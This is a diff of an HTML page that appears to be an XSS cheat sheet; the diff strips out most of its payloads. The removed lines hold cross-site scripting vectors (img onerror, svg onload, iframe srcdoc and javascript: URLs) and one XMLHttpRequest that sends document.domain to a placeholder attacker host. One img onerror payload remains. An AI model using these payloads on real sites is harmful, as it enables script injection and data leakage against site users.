@@ -1,26 +1,14 @@
 <html>
 	<head>
-		<title>XSS Cheat Sheet</title>
+		<title>XSS</title>
 	</head>
 	
 	<body>
-		<h1><i>[General XSS]</i></h1>
-	<img src=x onerror=alert("XSS Hurray")>
-
-	<script src=data:&comma;alert("SRC XSS")>
-
-	<svg/onload=alert("SVGXSS")>
-
-	<iframe src="" srcdoc="<script>alert("IFRAME XSS")</script>"></iframe>
-
-	<iframe src="javascript:alert("JAVASCRIPT:")"></iframe>
+	
 			
-<svg </onload ="1> (_=prompt,_("SVGONLOAD"))"">
-"autofocus/onfocus="thr=new XMLHttpRequest();
-			thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true); 
-			thr.send(null);"//x@x.com
+
 			
-			</code><--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
+			<--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
 		
 
 
